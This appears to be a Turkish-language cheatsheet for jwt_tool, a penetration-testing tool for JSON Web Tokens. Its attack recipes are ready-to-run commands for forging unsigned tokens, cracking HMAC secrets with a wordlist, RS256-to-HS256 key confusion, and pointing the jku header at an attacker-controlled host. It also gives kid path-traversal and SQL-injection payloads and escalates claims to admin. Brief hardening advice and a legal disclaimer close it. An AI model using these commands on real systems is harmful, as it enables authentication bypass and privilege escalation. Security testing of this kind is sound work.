# 🪙 jwt_tool - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
      Hepsi Bir Arada JSON Web Token (JWT) Manipülasyon ve İstismar Paketi
```

<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_İstismarı-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Yazar-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Kategori-Web_Güvenliği_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/Lisans-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🪙 JSON Web Token (JWT) yapılarını inceleyen, imza korumalarını atlatan, gizli anahtarları kıran ve sahte token üreten güçlü Python CLI aracı</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve JWT Anatomisi](#-genel-bakış-ve-jwt-anatomisi)
- [Kurulum](#-kurulum)
- [Token Çözümleme ve İnceleme](#-token-çözümleme-ve-i̇nceleme)
- [Otomatik Zafiyet Taraması (`-M at`)](#-otomatik-zafiyet-taraması--m-at)
- [Yaygın İstismar Senaryoları](#-yaygın-i̇stismar-senaryoları)
  - [Algoritma Karışıklığı / None Saldırısı (`none`)](#algoritma-karışıklığı--none-saldırısı-none)
  - [HMAC Gizli Anahtar Kırma](#hmac-gizli-anahtar-kırma)
  - [Anahtar Karmaşası: RS256'dan HS256'ya Geçiş](#anahtar-karmaşası-rs256dan-hs256ya-geçiş)
  - [Başlık Enjeksiyonu: JKU, X5U ve JWK Sahteciliği](#başlık-enjeksiyonu-jku-x5u-ve-jwk-sahteciliği)
  - [KID Parametresi İstismarı (SQLi ve Path Traversal)](#kid-parametresi-i̇stismarı-sqli-ve-path-traversal)
- [Payload Değiştirme ve Yetki Yükseltme](#-payload-değiştirme-ve-yetki-yükseltme)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Sıkılaştırma](#-savunma-yöntemleri-ve-sıkılaştırma)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve JWT Anatomisi

JSON Web Token (RFC 7519), noktalarla (`.`) ayrılmış üç Base64URL kodlu bölümden oluşur:
`başlık (header).yük (payload).imza (signature)`

1. **Başlık (Header):** Token türünü (`typ`) ve imzalama algoritmasını (`alg`, ör. `HS256`, `RS256`, `none`) belirtir.
2. **Yük (Payload):** Kullanıcı bilgilerini ve yetkilerini içerir (`sub`, `role`, `admin`, `exp`).
3. **İmza (Signature):** Verilerin değiştirilmesini engelleyen kriptografik kontroldür.

**ticarpi** tarafından geliştirilen **jwt_tool**, modern web ve API servislerinde kullanılan JWT token'larının imza denetimlerini atlatmak, şifreleme anahtarlarını kırmak ve yetki yükseltmek için kullanılan sektör standardı CLI aracıdır.

---

## 📥 Kurulum

```bash
# Depoyu klonlama
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Bağımlılıkları yükleme
pip install -r requirements.txt

# Çalıştırma
python3 jwt_tool.py --help
```

---

## 🔍 Token Çözümleme ve İnceleme

Token başlığını ve verilerini terminalde çözüp biçimlendirilmiş JSON olarak görmek:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```

---

## ⚡ Otomatik Zafiyet Taraması (`-M at`)

Hedef web servisine karşı bilinen tüm JWT zafiyetlerini otomatik test eden tarama başlatma:

```bash
# Tüm testleri (-M at) hedef API uç noktasına karşı çalıştır
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Denetlenen saldırı kalıpları:*
- İmza silme (None algoritması varyasyonları)
- RSA'dan HMAC'e anahtar karmaşası
- Claim manipülasyonu (`admin=true` yetki yükseltme)
- `kid`, `jku`, `x5u` parametrelerine enjeksiyon
- Boş imza doğrulaması

---

## 💥 Yaygın İstismar Senaryoları

### Algoritma Karışıklığı / None Saldırısı (`none`)
Sunucu imzasız token'ları kabul ediyorsa:
```bash
# 'none' algoritmasıyla imzasız token üretme
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Otomatik denenen varyasyonlar:* `none`, `None`, `NONE`, `nOnE`.

### HMAC Gizli Anahtar Kırma
HS256/HS384/HS512 algoritması zayıf bir parola ile imzalanmışsa:
```bash
# rockyou.txt sözlüğü ile kırma denemesi
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### Anahtar Karmaşası: RS256'dan HS256'ya Geçiş
Sunucu normalde RSA (RS256) kullanıyor ancak HMAC (HS256) kabul ediyorsa, sunucunun public anahtarı simetrik şifreleme anahtarı olarak suistimal edilebilir:
```bash
# Sunucu public anahtarını kullanarak token üret
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```

### Başlık Enjeksiyonu: JKU, X5U ve JWK Sahteciliği
Saldırgan kontrollü harici anahtar adresi enjekte etme:
```bash
# jku başlığına saldırganın JWKS adresini ekleme
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://saldirgan.com/jwks.json" -S hs256 -k parola
```

### KID Parametresi İstismarı (SQLi ve Path Traversal)
Sunucu `kid` (Key ID) başlığını doğrudan veritabanında sorguluyor veya dosya yolu olarak açıyorsa:
```bash
# /dev/null yoluna işaret ederek boş parola ile doğrulama
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection ile imza doğrulamasını baypas etme
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'gizli_anahtar'--" -S hs256 -p "gizli_anahtar"
```

---

## ✍️ Payload Değiştirme ve Yetki Yükseltme

Token içindeki kullanıcı değerlerini değiştirip bilinen anahtarla yeniden imzalama:

```bash
# 'admin' değerini true, 'role' değerini 'SuperAdmin' yapıp imzalama
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "gizli_anahtar"
```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Komut |
|------|-------|
| **Token'ı Çözümle** | `python3 jwt_tool.py <JWT>` |
| **Otomatik Zafiyet Taraması**| `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **HMAC Parolasını Kır** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **None Algoritması Dene** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Karmaşası**| `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Yetki Değiştir & İmzala** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **KID Path Traversal** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Savunma Yöntemleri ve Sıkılaştırma

1. **Katı Algoritma İzin Listesi:** `none` algoritmasını kesinlikle reddedin. Backend kodunda yalnızca beklenen algoritmayı (`RS256`) açıkça doğrulayın.
2. **Kullanıcı Kontrollü Başlıkları Reddetme:** `jku`, `jwk` veya `x5u` başlıklarını izinli alan adları haricinde asla kabul etmeyin.
3. **Güçlü Kriptografik Anahtarlar:** HMAC parolalarının en az 256 bit yüksek entropili rastgele baytlardan oluşmasını sağlayın.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> jwt_tool yalnızca yasal izin alınmış sızma testleri, API güvenlik analizleri ve eğitim amacıyla kullanılmalıdır. İzniniz olmayan sistemlerde token sahteciliği yapmak suçtur.
